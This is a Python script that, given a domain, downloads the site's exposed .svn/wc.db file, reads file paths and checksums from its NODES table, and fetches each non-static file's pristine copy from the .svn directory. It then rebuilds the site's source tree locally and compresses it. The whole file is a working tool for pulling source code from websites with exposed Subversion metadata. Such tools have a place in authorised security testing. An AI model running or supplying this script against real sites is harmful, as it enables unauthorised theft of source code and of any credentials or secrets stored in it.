import shutil
import sqlite3
import tarfile
import requests
import os.path
from sys import argv
scriptname,sitename = argv

# Blacklisted file types
blacklist = ['.css', '.scss', '.js', '.html', '.img', '.png', '.jpg', '.jpeg', '.gif', '.tff', '.otf', '.svg', '.ico']
os.makedirs(sitename)
dbfile = sitename + '/wc.db'
dbftd = 'https://' + sitename + '/.svn/wc.db'
with open(dbfile, "wb") as f:
  db = requests.get(dbftd)
  f.write(db.content)
sn1 = 'https://' + sitename
con = sqlite3.connect(dbfile)

# Initialize SQLite Connection
cur = con.cursor()

# Print Tables in wc.db
table_list = [a for a in cur.execute("SELECT name FROM sqlite_master WHERE type = 'table'")]
print("Tables: ")
print(table_list)
print('\n')

# Print Columns In NODES
curcom = con.execute('select * from NODES')
comms = list(map(lambda x: x[0], curcom.description))
print("Columns in NODES: ")
print(comms)
print('\n')

# Extract checksum, repos_path.
rt1 = con.execute('select repos_path, checksum from NODES where checksum is not NULL')
rt = rt1.fetchall()
print("Total number of files: " + str(len(rt)) + '\n')

# Iterate over each column in nodes
for r in rt:
    try:
        if any(r[0].rsplit('.', 1)[1] in x for x in blacklist):
            print("[-] " + r[0])
        else:
            if r[1] and not r[1].isspace():
                fhash = r[1].split('$')[2]
                # print(fhash)
                mrd = dbfile.split('/')[0] + '/' + r[0]
                fst = sn1 + "/.svn/pristine/" + fhash[:2] + "/" + fhash + ".svn-base"
                if not os.path.exists(mrd.rsplit('/', 1)[0]):
                    os.makedirs(mrd.rsplit('/', 1)[0])
                req = requests.get(fst)
                f = open(mrd, "w")
                f.write(req.text)
                f.close()
                print("[+] " + fst + " > " + dbfile.split('/')[0] + '/' + r[0])
    except Exception as e:
        print(str(e) + ": " + r[0])
con.close()

# Compress directory with source code and rm original directory to save space
with tarfile.open(sitename + ".tgz", "w:gz") as tar:
    tar.add(sitename)
#shutil.rmtree(sitename)
